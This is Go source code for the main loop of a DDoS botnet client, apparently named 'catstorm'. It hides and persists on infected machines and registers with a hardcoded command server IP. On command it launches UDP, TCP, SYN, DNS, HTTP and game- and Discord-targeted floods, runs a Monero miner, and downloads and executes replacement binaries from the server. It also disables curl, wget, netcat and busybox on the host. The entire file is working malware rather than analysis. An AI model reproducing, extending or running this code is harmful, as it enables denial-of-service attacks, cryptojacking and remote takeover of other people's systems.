package main

import (
	"bufio"
	methods "catstorm/Bot/Methods"
	"catstorm/Bot/Methods/l4"
	"catstorm/Bot/Methods/l7"
	"catstorm/Bot/process"
	"context"
	"io"
	"net"
	"net/http"
	"os"
	"runtime"
	"runtime/debug"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

var (
	ServerIP   = "77.239.124.255"
	ServerPort = "1337"
	BotMode    = "full"
)

var lockPaths = []string{
	"/usr/bin/curl", "/bin/curl", "/usr/local/bin/curl",
	"/usr/bin/wget", "/bin/wget", "/usr/local/bin/wget",
	"/usr/bin/wget2", "/usr/bin/ftp", "/bin/ftp",
	"/usr/bin/ftpget", "/bin/ftpget",
	"/usr/bin/tftp", "/bin/tftp",
	"/usr/bin/scp", "/bin/scp",
	"/usr/bin/nc", "/bin/nc", "/usr/bin/netcat", "/bin/netcat",
	"/usr/bin/socat", "/bin/socat",
	"/usr/bin/axel", "/usr/bin/aria2c",
	"/usr/bin/rsync", "/bin/rsync",
	"/usr/bin/openssl", "/bin/openssl",
	"/usr/bin/sftp", "/bin/sftp",
	"/usr/bin/curl", "/data/local/tmp/curl",
	"/bin/busybox",
}

func lock() {
	for _, p := range lockPaths {
		fi, e := os.Lstat(p)
		if e != nil {
			continue
		}
		if fi.Mode()&os.ModeSymlink != 0 {
			os.Remove(p)
		} else {
			os.Chmod(p, 0)
		}
	}
}

func unlock() {
	for _, p := range lockPaths {
		fi, e := os.Lstat(p)
		if e != nil {
			continue
		}
		if fi.Mode()&os.ModeSymlink != 0 {
			continue
		}
		os.Chmod(p, 0755)
	}
}

func getBinName() string {
	switch runtime.GOARCH {
	case "amd64":
		return "x86_64"
	case "386":
		return "x86"
	case "arm":
		return "armv7l"
	case "arm64":
		return "aarch64"
	case "mips":
		return "mips"
	case "mipsle":
		return "mipsel"
	case "ppc64", "ppc64le":
		return "ppc64"
	case "ppc":
		return "ppc"
	default:
		return "x86_64"
	}
}

type floodEntry struct {
	cancel context.CancelFunc
	id     int64
}

var (
	activeFloods   = make(map[string]floodEntry)
	activeFloodsMu sync.Mutex
	floodIDCounter int64
	botBusy        atomic.Int32
)

func resolveDomain(domain string) string {
	servers := []string{"1.1.1.1:53", "1.0.0.1:53", "8.8.8.8:53", "8.8.4.4:53"}
	for _, s := range servers {
		r := &net.Resolver{
			Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
				d := net.Dialer{Timeout: 3 * time.Second}
				return d.DialContext(ctx, "udp", s)
			},
		}
		ips, err := r.LookupHost(context.Background(), domain)
		if err == nil && len(ips) > 0 {
			return ips[0]
		}
	}
	return domain
}

func main() {
	debug.SetGCPercent(10)
	runtime.GOMAXPROCS(1)

	variant := ""
	if len(os.Args) >= 2 && os.Args[1] != "" {
		variant = os.Args[1]
	}

	process.Hide()
	process.Protect()
	//rocess.StartKiller()
	process.Persist()
	//lock()

	speedMbps := methods.RunSpeedtest()

	domain := ServerIP
	addr := resolveDomain(domain) + ":" + ServerPort
	lastResolve := time.Now()

	for {
		if time.Since(lastResolve) > 30*time.Second {
			if resolved := resolveDomain(domain); resolved != domain {
				addr = resolved + ":" + ServerPort
			}
			lastResolve = time.Now()
		}
		conn, er := net.Dial("tcp", addr)
		if er != nil {
			time.Sleep(5 * time.Second)
			continue
		}

		if tcp, ok := conn.(*net.TCPConn); ok {
			tcp.SetKeepAlive(true)
			tcp.SetKeepAlivePeriod(10 * time.Second)
		}

		conn.Write([]byte("REGISTER " + runtime.GOOS + " " + runtime.GOARCH + " " + strconv.Itoa(runtime.NumCPU()) + " " + strconv.FormatInt(process.GetTotalRAM(), 10) + " " + strconv.FormatInt(process.GetTotalDisk(), 10) + " " + BotMode + " " + strconv.FormatFloat(speedMbps, 'f', 0, 64) + " " + variant + "\n"))

		scanner := bufio.NewScanner(conn)
		for scanner.Scan() {
			args := strings.Fields(scanner.Text())
			if len(args) == 0 {
				continue
			}

			if !methodAllowed(args[0]) {
				continue
			}
			switch args[0] {
			case "stop":
				if len(args) < 2 {
					continue
				}
				activeFloodsMu.Lock()
				if e, ok := activeFloods[args[1]]; ok {
					e.cancel()
					delete(activeFloods, args[1])
				}
				activeFloodsMu.Unlock()

			case "update":
				updateURL := ""
				if len(args) >= 2 {
					updateURL = args[1]
				} else {
					updateURL = "http://" + ServerIP + "/" + getBinName()
				}
				go func(c net.Conn) {
					unlock()
					defer lock()
					resp, err := http.Get(updateURL)
					if err != nil {
						c.Write([]byte("UPDATE_FAIL\n"))
						return
					}
					defer resp.Body.Close()
					tmp := "/tmp/.upd"
					f, err := os.OpenFile(tmp, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0755)
					if err != nil {
						c.Write([]byte("UPDATE_FAIL\n"))
						return
					}
					if _, err := io.Copy(f, resp.Body); err != nil {
						f.Close()
						os.Remove(tmp)
						c.Write([]byte("UPDATE_FAIL\n"))
						return
					}
					f.Close()
					if fi, _ := os.Stat(tmp); fi != nil && fi.Size() > 4096 {
						c.Write([]byte("UPDATE_OK\n"))
						syscall.Exec(tmp, []string{tmp}, os.Environ())
					}
					c.Write([]byte("UPDATE_FAIL\n"))
					os.Remove(tmp)
				}(conn)

			case "udp":
				if runtime.GOOS == "windows" || len(args) < 4 {
					continue
				}
				tgt := args[1]
				p := args[2]
				d, _ := strconv.Atoi(args[3])
				startAttack(tgt, d, func(cx context.Context) {
					l4.Udpflood(cx, tgt, p, d)
				})

			case "http":
				if len(args) < 3 {
					continue
				}
				tgt := args[1]
				d, _ := strconv.Atoi(args[2])
				startAttack(tgt, d, func(cx context.Context) {
					l7.Httpflood(cx, tgt, d)
				})

			case "tcp":
				if len(args) < 4 {
					continue
				}
				tgt := args[1]
				p := args[2]
				d, _ := strconv.Atoi(args[3])
				startAttack(tgt, d, func(cx context.Context) {
					l4.Tcpflood(cx, tgt, p, d)
				})

			case "syn":
				if len(args) < 4 {
					continue
				}
				tgt := args[1]
				p := args[2]
				d, _ := strconv.Atoi(args[3])
				startAttack(tgt, d, func(cx context.Context) {
					l4.Synflood(cx, tgt, p, d)
				})

			case "ack":
				if len(args) < 4 {
					continue
				}
				tgt := args[1]
				p := args[2]
				d, _ := strconv.Atoi(args[3])
				startAttack(tgt, d, func(cx context.Context) {
					l4.Ackflood(cx, tgt, p, d)
				})

			case "udp-bypass":
				if runtime.GOOS == "windows" || len(args) < 4 {
					continue
				}
				tgt := args[1]
				p := args[2]
				d, _ := strconv.Atoi(args[3])
				startAttack(tgt, d, func(cx context.Context) {
					l4.Udpbypassflood(cx, tgt, p, d)
				})

			case "pps", "udp-pps":
				if runtime.GOOS == "windows" || len(args) < 4 {
					continue
				}
				tgt := args[1]
				p := args[2]
				d, _ := strconv.Atoi(args[3])
				startAttack(tgt, d, func(cx context.Context) {
					l4.Ppsflood(cx, tgt, p, d)
				})

			case "tcp-bypass":
				if len(args) < 4 {
					continue
				}
				tgt := args[1]
				p := args[2]
				d, _ := strconv.Atoi(args[3])
				startAttack(tgt, d, func(cx context.Context) {
					l4.Tcpbypassflood(cx, tgt, p, d)
				})

			case "tcp-stomp":
				if len(args) < 4 {
					continue
				}
				tgt := args[1]
				p := args[2]
				d, _ := strconv.Atoi(args[3])
				startAttack(tgt, d, func(cx context.Context) {
					l4.Tcpstompflood(cx, tgt, p, d)
				})

			case "dns":
				if runtime.GOOS == "windows" || len(args) < 4 {
					continue
				}
				tgt := args[1]
				p := args[2]
				d, _ := strconv.Atoi(args[3])
				startAttack(tgt, d, func(cx context.Context) {
					l4.Dnsflood(cx, tgt, p, d)
				})

			case "fortnite":
				if runtime.GOOS == "windows" || len(args) < 4 {
					continue
				}
				tgt := args[1]
				p := args[2]
				d, _ := strconv.Atoi(args[3])
				startAttack(tgt, d, func(cx context.Context) {
					l4.Fortniteflood(cx, tgt, p, d)
				})

			case "minecraft":
				if runtime.GOOS == "windows" || len(args) < 4 {
					continue
				}
				tgt := args[1]
				p := args[2]
				d, _ := strconv.Atoi(args[3])
				startAttack(tgt, d, func(cx context.Context) {
					l4.Minecraftflood(cx, tgt, p, d)
				})

			case "ssh":
				if len(args) < 4 {
					continue
				}
				tgt := args[1]
				p := args[2]
				d, _ := strconv.Atoi(args[3])
				startAttack(tgt, d, func(cx context.Context) {
					l4.Sshflood(cx, tgt, p, d)
				})

			case "discord":
				if runtime.GOOS == "windows" || len(args) < 4 {
					continue
				}
				tgt := args[1]
				p := args[2]
				d, _ := strconv.Atoi(args[3])
				startAttack(tgt, d, func(cx context.Context) {
					l4.Discordflood(cx, tgt, p, d)
				})

			case "http-bypass":
				if len(args) < 3 {
					continue
				}
				tgt := args[1]
				d, _ := strconv.Atoi(args[2])
				startAttack(tgt, d, func(cx context.Context) {
					l7.Httpbypassflood(cx, tgt, d)
				})
			case "monero":
				if len(args) < 3 {
					continue
				}
				wallet := args[1]
				pool := args[2]
				sec := 86400
				if len(args) >= 4 {
					if x, e := strconv.Atoi(args[3]); e == nil && x > 0 {
						sec = x
					}
				}
				startAttack("monero", sec, func(cx context.Context) {
					methods.MoneroMiner(cx, ServerIP, wallet, pool)
				})
			}
		}
		conn.Close()
		time.Sleep(5 * time.Second)
	}
}

func methodAllowed(name string) bool {
	// JS script methods — not executable by Go bots
	switch name {
	case "cache-bp", "http-huricane", "sock-flooder", "priv-flood":
		return false
	}
	if BotMode == "full" || name == "stop" || name == "monero" || name == "update" {
		return true
	}
	switch name {
	case "udp", "udp-bypass", "pps", "udp-pps", "tcp", "tcp-bypass", "tcp-stomp", "syn", "ack", "dns", "fortnite", "minecraft", "ssh", "discord":
		return BotMode == "l4"
	case "http", "http-bypass":
		return BotMode == "l7"
	}
	return false
}

func startAttack(target string, duration int, fn func(context.Context)) {
	if !botBusy.CompareAndSwap(0, 1) {
		return
	}
	if duration < 1 || duration > 86400*7 {
		duration = 86400
	}
	id := atomic.AddInt64(&floodIDCounter, 1)
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	activeFloodsMu.Lock()
	if e, ok := activeFloods[target]; ok {
		e.cancel()
	}
	activeFloods[target] = floodEntry{cancel: cancel, id: id}
	activeFloodsMu.Unlock()
	go func() {
		defer botBusy.Store(0)
		fn(ctx)
		activeFloodsMu.Lock()
		if e, ok := activeFloods[target]; ok && e.id == id {
			delete(activeFloods, target)
		}
		activeFloodsMu.Unlock()
	}()
}
